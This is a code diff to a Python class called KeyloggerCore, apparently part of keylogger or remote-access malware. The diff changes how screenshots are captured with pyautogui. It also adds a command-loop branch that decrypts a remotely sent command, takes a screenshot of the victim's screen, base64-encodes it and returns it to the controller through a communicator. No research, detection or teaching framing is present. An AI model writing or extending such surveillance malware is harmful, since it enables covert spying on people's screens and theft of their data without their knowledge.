@@ -42,10 +42,8 @@ class KeyloggerCore:
     def _capture_screenshot(self):
         try:
             screenshot = pyautogui.screenshot()
-            # Convert directly to Pillow Image
-            img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
             img_byte_arr = io.BytesIO()
-            img.save(img_byte_arr, format='PNG')
+            screenshot.save(img_byte_arr, format='PNG')
             return img_byte_arr.getvalue()
         except Exception as e:
             self._handle_error(f"Screenshot capture error: {str(e)}")
@@ -98,22 +96,30 @@ class KeyloggerCore:
             try:
                 if not all(k in cmd for k in ('id', 'command', 'type')):
                     raise CommandError(f"Invalid command structure: {cmd}")
-
+    
                 decrypted = self.encryption.decrypt(cmd['command'])
                 logging.info(f"Decrypted command: {decrypted}")
                 command_data = json.loads(decrypted)
                 logging.info(f"Parsed command data: {command_data}")
-
+                logging.info(f"Command received - Type: {command_data['type']}, Params: {command_data.get('params')}")
+    
                 if 'type' not in command_data:
                     raise CommandError(f"Missing 'type' in decrypted command: {command_data}")
-
-                result = CommandHandler.execute(
-                    command_data['type'],
-                    command_data.get('params', {})
-                )
+    
+                if command_data['type'] == 'capture_screenshot':
+                    screenshot = self._capture_screenshot()
+                    if screenshot:
+                        result = {"screenshot": base64.b64encode(screenshot).decode()}
+                    else:
+                        raise CommandError("Failed to capture screenshot")
+                else:
+                    result = CommandHandler.execute(
+                        command_data['type'],
+                        command_data.get('params', {})
+                    )
                 logging.info(f"Command executed successfully: {command_data['type']}, Result: {result}")
                 self.communicator.send_command_result(cmd['id'], result)
-
+    
             except (KeyError, json.JSONDecodeError) as e:
                 self._handle_error(f"Invalid command format: {str(e)}, Command: {cmd}")
             except CommandError as e:
